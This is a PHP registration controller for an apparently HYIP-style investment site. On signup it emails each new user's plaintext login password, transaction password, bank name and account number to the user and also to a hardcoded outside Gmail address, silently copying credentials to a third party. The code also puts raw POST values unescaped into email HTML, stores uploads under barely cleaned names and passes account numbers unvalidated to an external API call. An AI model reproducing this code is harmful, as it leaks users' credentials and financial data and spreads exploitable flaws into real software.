<?php
class ControllerAccountRegister extends Controller {
	private $error = array();

	public function index() {
		function myCheckLoign($self) {
			return $self -> customer -> isLogged() ? true : false;
		};

		//method to call function
		!call_user_func_array("myCheckLoign", array($this)) && $this -> response -> redirect($this -> url -> link('account/login', '', 'SSL'));

		$this -> document -> addScript('catalog/view/javascript/register/register.js');


		if ($this -> request -> server['REQUEST_METHOD'] === 'POST') {

		}

		//language
		$this -> load -> model('account/customer');
		$block_id = $this -> check_block_id();
		
		if (intval($block_id) !== 0) $this->response->redirect(HTTPS_SERVER . 'lock.html');

		$getLanguage = $this -> model_account_customer -> getLanguage($this -> customer -> getId());
		$language = new Language($getLanguage);
		$language -> load('account/register');
		$data['lang'] = $language -> data;

		//start load country model
		$this -> load -> model('customize/country');
		if ($this->request->server['HTTPS']) {
			$server = $this->config->get('config_ssl');
		} else {
			$server = $this->config->get('config_url');
		}

		$data['base'] = $server;
		$data['customer_code'] = $this -> model_account_customer -> getCustomer($this -> customer -> getId());
		$data['customer_code'] = $data['customer_code']['username'];

		$data['country'] = $this -> model_customize_country -> getCountry();
		//end load country model

		//data render website
		$data['self'] = $this;

		//error validate
		$data['error'] = $this -> error;
		$data['p_binary'] = false;
		$data['has_register'] = false;

		if ($this->request->server['REQUEST_METHOD'] === 'POST'){
			
			$this -> load -> model('customize/register');
			$this -> load -> model('account/auto');
			$this -> load -> model('account/customer');
			! array_key_exists('bank_name', $this -> request -> post) && die();
			! array_key_exists('username', $this -> request -> post) && die();
			! array_key_exists('account_number', $this -> request -> post) && die();
			! array_key_exists('password', $this -> request -> post) && die();
			! array_key_exists('account_holder', $this -> request -> post) && die();
			! array_key_exists('avatar', $this -> request -> files) && die();

			$check_files = (file_exists($_FILES['avatar']['tmp_name']));
			//if (intval($check_files) != 1) die('Error files');
			
			$checkUser = intval($this -> model_customize_register -> checkExitUserName($_POST['username'])) === 1 ? 1 : -1;
		
			$checkEmail = intval($this -> model_customize_register -> checkExitEmail($_POST['email'])) === 1 ? 1 : -1;
			$checkPhone = intval($this -> model_customize_register -> checkExitPhone($_POST['telephone'])) === 1 ? 1 : -1;
			$checkAccount_number= intval($this -> model_customize_register -> checkExitCMND($_POST['account_number'])) === 1 ? 1 : -1;
			$checkCmnd= intval($this -> model_customize_register -> checkExitCMNDS($_POST['cmnds'])) === 1 ? 1 : -1;
			
			if ($checkUser == 1 || $checkEmail == 1 || $checkPhone == 1 || $checkCmnd == 1 || $checkAccount_number == 1) {
				die('Error');
			}

			$tmp = $this -> model_customize_register -> addCustomer($this->request->post);

			$this -> model_customize_register -> update_customer_code($tmp);

			$data['has_register'] = true;
			$cus_id= $tmp;

			$file = $this -> avatar($this -> request -> files, $cus_id);

			$amount = 0;
			//$this -> model_account_customer -> updatePin_sub($this -> session -> data['customer_id'], 5 );

			$this -> model_account_customer -> saveHistoryPin(
					$this -> session -> data['customer_id'],  
					'- 5',
					'Use Pin for register '.$_POST['username'],
					'Register',
					'Use Pin for register '.$_POST['username']
				);
			$checkC_Wallet = $this -> model_account_customer -> checkR_Wallet($cus_id);
			if(intval($checkC_Wallet['number'])  === 0){
				if(!$this -> model_account_customer -> insertR_WalletR($amount, $cus_id)){
					die();
				}
			}
			$this -> model_account_customer -> insert_block_id($cus_id);
			$this -> model_account_customer -> insertC_Wallet($cus_id);
			
			$mail = new Mail();
			$mail -> protocol = $this -> config -> get('config_mail_protocol');
			$mail -> parameter = $this -> config -> get('config_mail_parameter');
			$mail -> smtp_hostname = $this -> config -> get('config_mail_smtp_hostname');
			$mail -> smtp_username = $this -> config -> get('config_mail_smtp_username');
			$mail -> smtp_password = html_entity_decode($this -> config -> get('config_mail_smtp_password'), ENT_QUOTES, 'UTF-8');
			$mail -> smtp_port = $this -> config -> get('config_mail_smtp_port');
			$mail -> smtp_timeout = $this -> config -> get('config_mail_smtp_timeout');

			//$mail -> setTo($this -> config -> get('config_email'));
		
			$mail->setTo(array(0 => ''.$_POST['email'].'', 1 => 'mmo.hyipcent@gmail.com'));
			$mail -> setFrom($this -> config -> get('config_email'));
			$mail -> setSender(html_entity_decode("Iontach Community", ENT_QUOTES, 'UTF-8'));
			$mail -> setSubject("Congratulations Your Registration is Confirmed!");
			$mail -> setHtml('
            
         <table align="center" bgcolor="#eeeeee" border="0" cellpadding="0" cellspacing="0" style="background:#eeeeee;border-collapse:collapse;line-height:100%!important;margin:0;padding:0;width:100%!important">
         <tbody>
            <tr>
               <td>
                  <table style="border-collapse:collapse;margin:auto;max-width:635px;min-width:320px;width:100%">
         <tbody>
            <tr>
               <td>
                  <table style="border-collapse:collapse;color:#c0c0c0;font-family:"Helvetica Neue",Arial,sans-serif;font-size:13px;line-height:26px;margin:0 auto 26px;width:100%">
                     <tbody>
                        <tr>
			        <td>
			          <div style="text-align:center" class="ajs-header"><img src="'.HTTP_SERVER.'catalog/view/theme/default/img/logo.png'.'" alt="logo" style="margin: 20px auto; width:250px;"></div>
			        </td>
			       </tr>
                     </tbody>
                  </table>
               </td>
            </tr>
            <tr>
               <td>
                  <table style="width:600px;" align="center" border="0" cellspacing="0" style="border-collapse:collapse;border-radius:3px;color:#545454;font-family:"Helvetica Neue",Arial,sans-serif;font-size:13px;line-height:20px;margin:0 auto;width:100%">
         <tbody>
            <tr>
               <td>
                  <table border="0" cellpadding="0" cellspacing="0" style="border:none;border-collapse:separate;font-size:1px;height:2px;line-height:3px;width:100%">
                     <tbody>
                        <tr>
                           <td bgcolor="#9B59B6" valign="top"> </td>
                        </tr>
                     </tbody>
                  </table>
                  <table style="width:600px; border="0" cellpadding="0" cellspacing="0" height="100%" style="border-collapse:collapse;border-color:#dddddd;border-radius:0 0 3px 3px;border-style:solid;border-width:1px;width:100%" width="100%">
         <tbody>
            <tr>
               <td align="center" valign="top">
                  <table border="0" cellpadding="0" cellspacing="0" width="100%">
                     <tbody>
                        <tr>
                           <td align="center" style="background:#ffffff">
                              <a href="https://iontach.biz" target="_blank" data-saferedirecturl="happymoney.us">
                                 <h1 style="margin-top:30px; font-weight:bold;">Iontach.biz</h1>
                              </a>
                           </td>
                        </tr>
                     </tbody>
                  </table>
               </td>
            </tr>
            <table style="background:#FFF; padding:25px;width:600px">
               <tbody>
                  <tr>
                     <td style="padding:30px;background:white;color:#525252;font-family:"Helvetica Neue",Arial,sans-serif;font-size:15px;line-height:22px;overflow:hidden;">
                  <p><span>Hello <b>'.$_POST['username'].'</b>,</span></p>
                  <p><span>Congratulations Your Registration is Confirmed!</span></p>
                  <p><strong>Your account holder: <span style="color:#5cb85c">'.$_POST['account_holder'].'</span></strong></p>
                  <p><strong>Bank: <span style="color:#5cb85c">'.$_POST['bank_name'].'</span></strong></p>
                  <p><strong>Account number: <span style="color:#5cb85c">'.$_POST['account_number'].'</span></strong></p>
                  <p><strong>Email: <span style="color:#5cb85c">'.$_POST['email'].'</span></strong></p>
                  <p><strong>Phone Number: <span style="color:#5cb85c">'.$_POST['telephone'].'</span></strong></p>
                  <p><strong>Username: <span style="color:#5cb85c">'.$_POST['username'].'</span></strong></p>
                  <p><strong>Password Login: <span style="color:#5cb85c">'.$_POST['password'].'</span></strong></p>
            <p><strong>Transaction Password: <span style="color:#5cb85c">'.$_POST['password2'].'</span></strong></p>
                  <p><strong>Date<strong>: '.date('d/m/Y H:i:s').'</p></td></p>
                   
                  </tr>
               </tbody>
            </table>
             <hr>
			');
			$mail -> send();
			//print_r($mail); die;
			// $this -> response -> redirect($this -> url -> link('account/register', '#success', 'SSL'));
			$this->response->redirect(HTTPS_SERVER . 'register.html#success');
		}


		if (file_exists(DIR_TEMPLATE . $this -> config -> get('config_template') . '/template/account/register.tpl')) {
			$this -> response -> setOutput($this -> load -> view($this -> config -> get('config_template') . '/template/account/register.tpl', $data));
		} else {
			$this -> response -> setOutput($this -> load -> view('default/template/account/register.tpl', $data));
		}

	}
	public function avatar($file,$cus_id){
	$this->load->model('account/customer');
	
		$filename = html_entity_decode($this->request->files['avatar']['name'], ENT_QUOTES, 'UTF-8');
		
		$filename = str_replace(' ', '_', $filename);
		if(!$filename || !$this->request->files){
			die();
		}

		$file = $filename . '.' . md5(mt_rand()) ;

		
		move_uploaded_file($this->request->files['avatar']['tmp_name'], DIR_UPLOAD_CUSTOM . $file);


		//save image profile
		$server = $this -> request -> server['HTTPS'] ? $this -> config -> get('config_ssl') :  $this -> config -> get('config_url');
		
		$linkImage = $server . 'system/card/'.$file;
	
		$this -> model_account_customer -> update_avatar($cus_id,$linkImage);

		
	}
		public function country() {
		$json = array();

		$this->load->model('customize/country');

		$country_info = $this->model_customize_country->getCountrys($this->request->get['country_id']);

		if ($country_info) {
			$this->load->model('localisation/zone');

			$json = array(
				'country_id'        => $country_info['country_id'],
				'name'              => $country_info['name'],
				'iso_code_2'        => $country_info['iso_code_2'],
				'iso_code_3'        => $country_info['iso_code_3'],
				'address_format'    => $country_info['address_format'],
				'postcode_required' => $country_info['postcode_required'],
				'zone'              => $this->model_customize_country->getZonesByCountryId($this->request->get['country_id']),
				'status'            => $country_info['status']
			);
		}

		$this->response->addHeader('Content-Type: application/json');
		$this->response->setOutput(json_encode($json));
	}
	public function check_block_id(){
		$this->load->model('account/customer');
		$block_id = $this -> model_account_customer -> get_block_id($this -> customer -> getId());
		
		return intval($block_id['status']);

	}
	public function check_pin(){
		$this -> load -> model('account/customer');
		$pin = $this -> model_account_customer -> check_pin($this->session->data['customer_id']);

		return $pin;
	}
	public function checkuser() {
		if (empty($_GET['username'])) die();
		if ($this -> request -> get['username']) {
			$this -> load -> model('customize/register');
			$json['success'] = intval($this -> model_customize_register -> checkExitUserName($this -> request -> get['username'])) === 1 ? 1 : 0;
			$this -> response -> setOutput(json_encode($json));
		}
	}

	public function checkemail() {
		if (empty($_GET['email'])) die();
		if ($this -> request -> get['email']) {
			$this -> load -> model('customize/register');
			$json['success'] = intval($this -> model_customize_register -> checkExitEmail($this -> request -> get['email'])) < 1 ? 0 : 1;
			$this -> response -> setOutput(json_encode($json));
		}
	}
	public function checkphone() {
		if (empty($_GET['phone'])) die();
		if ($this -> request -> get['phone']) {
			$this -> load -> model('customize/register');
			$json['success'] = intval($this -> model_customize_register -> checkExitPhone($this -> request -> get['phone'])) < 1 ? 0 : 1;
			$this -> response -> setOutput(json_encode($json));
		}
	}

	public function checkcmnd() {
		if (empty($_GET['cmnd'])) die();
		if ($this -> request -> get['cmnd']) {
			$this -> load -> model('customize/register');
			$json['success'] = intval($this -> model_customize_register -> checkExitCMND($this -> request -> get['cmnd'])) < 1 ? 0 : 1;
			$this -> response -> setOutput(json_encode($json));
		}
	}

	public function getjson(){
		if (empty($_POST['number_vcb'])) die();
		$account = $_POST['number_vcb'];
		$this -> load -> model('customize/register');
		$number = $this->model_customize_register->get_vcb($account);
		if (count($number) < 1)
		{
			$json = implode('', file('https://santienao.com/api/v1/bank_accounts/'.$account.''));
			echo  $json;
			$json_decode = json_decode($json);
			if ($json_decode->state == "fetched"){
				$this->model_customize_register->insert_vcb($json_decode->account_id,$json_decode->account_name,$json_decode->bank_name);
				die;
			}
		}
		else{
			$number = $this->model_customize_register->get_vcb($account);
			echo json_encode($number);
		}

	}



}
